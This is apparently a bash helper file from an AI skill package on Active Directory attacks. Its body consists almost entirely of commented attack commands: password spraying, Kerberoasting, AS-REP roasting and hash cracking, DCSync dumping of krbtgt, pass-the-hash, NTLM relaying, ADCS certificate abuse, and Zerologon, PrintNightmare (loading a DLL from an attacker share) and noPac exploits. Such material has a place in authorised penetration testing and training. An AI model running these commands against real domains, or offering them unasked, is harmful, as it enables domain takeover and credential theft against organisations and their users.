#!/bin/bash
# Helper script for sec-safety-0908-sec-safety-0014-active-directory-attacks

echo "Helper for sec-safety-0908-sec-safety-0014-active-directory-attacks"

# Command examples from SKILL.md:
# # Detect clock skew
# nmap -sT 10.10.10.10 -p445 --script smb2-time
# # Fix clock on Linux
# sudo date -s "14 APR 2024 18:25:16"
# # Fix clock on Windows
# net time /domain /set
# # Fake clock without changing system time
# faketime -f '+8h' <command>
# # Start BloodHound
# neo4j console
# bloodhound --no-sandbox
# # Collect data with SharpHound
# .\SharpHound.exe -c All
# .\SharpHound.exe -c All --ldapusername user --ldappassword pass
# # Python collector (from Linux)
# bloodhound-python -u 'user' -p 'password' -d domain.local -ns 10.10.10.10 -c all
# # Using kerbrute
# ./kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt Password123
# # Using CrackMapExec
# crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success
# # Impacket
# GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile hashes.txt
# # Rubeus
# .\Rubeus.exe kerberoast /outfile:hashes.txt
# # CrackMapExec
# crackmapexec ldap 10.10.10.10 -u user -p password --kerberoast output.txt
# # Crack with hashcat
# hashcat -m 13100 hashes.txt rockyou.txt
# # Impacket
# GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat
# # Rubeus
# .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
# # Crack with hashcat
# hashcat -m 18200 hashes.txt rockyou.txt
# # Impacket
# secretsdump.py domain.local/admin:password@10.10.10.10 -just-dc-user krbtgt
# # Mimikatz
# lsadump::dcsync /domain:domain.local /user:krbtgt
# lsadump::dcsync /domain:domain.local /user:Administrator
# # Impacket
# psexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
# wmiexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
# smbexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
# # CrackMapExec
# crackmapexec smb 10.10.10.10 -u Administrator -H NTHASH -d domain.local
# crackmapexec smb 10.10.10.10 -u Administrator -H NTHASH --local-auth
# # Impacket
# getTGT.py domain.local/user -hashes :NTHASH
# export KRB5CCNAME=user.ccache
# # Rubeus
# .\Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt
# # Start Responder (disable SMB/HTTP for relay)
# responder -I eth0 -wrf
# # Start relay
# ntlmrelayx.py -tf targets.txt -smb2support
# # LDAP relay for delegation attack
# ntlmrelayx.py -t ldaps://dc.domain.local -wh attacker-wpad --delegate-access
# crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt
# # Find vulnerable templates
# certipy find -u user@domain.local -p password -dc-ip 10.10.10.10
# # Exploit ESC1
# certipy req -u user@domain.local -p password -ca CA-NAME -target dc.domain.local -template VulnTemplate -upn administrator@domain.local
# # Authenticate with certificate
# certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
# ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# # Check vulnerability
# crackmapexec smb 10.10.10.10 -u '' -p '' -M zerologon
# # Exploit
# python3 cve-2020-1472-exploit.py DC01 10.10.10.10
# # Extract hashes
# secretsdump.py -just-dc domain.local/DC01\$@10.10.10.10 -no-pass
# # Restore password (important!)
# python3 restorepassword.py domain.local/DC01@DC01 -target-ip 10.10.10.10 -hexpass HEXPASSWORD
# # Check for vulnerability
# rpcdump.py @10.10.10.10 | grep 'MS-RPRN'
# # Exploit (requires hosting malicious DLL)
# python3 CVE-2021-1675.py domain.local/user:pass@10.10.10.10 '\\attacker\share\evil.dll'
# # Automated exploitation
# python3 sam_the_admin.py "domain.local/user:password" -dc-ip 10.10.10.10 -shell
# # 1. Find service accounts with SPNs
# GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10
# # 2. Request TGS tickets
# GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10 -request -outputfile tgs.txt
# # 3. Crack tickets
# hashcat -m 13100 tgs.txt rockyou.txt
# # 4. Use cracked service account
# psexec.py domain.local/svc_admin:CrackedPassword@10.10.10.10
# # 1. Start relay targeting LDAP
# ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access
# # 2. Trigger authentication (e.g., via PrinterBug)
# python3 printerbug.py domain.local/user:pass@target 10.10.10.12
# # 3. Use created machine account for RBCD attack
